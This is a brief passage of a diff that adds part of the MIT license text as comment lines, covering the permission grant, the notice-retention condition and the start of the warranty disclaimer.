+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
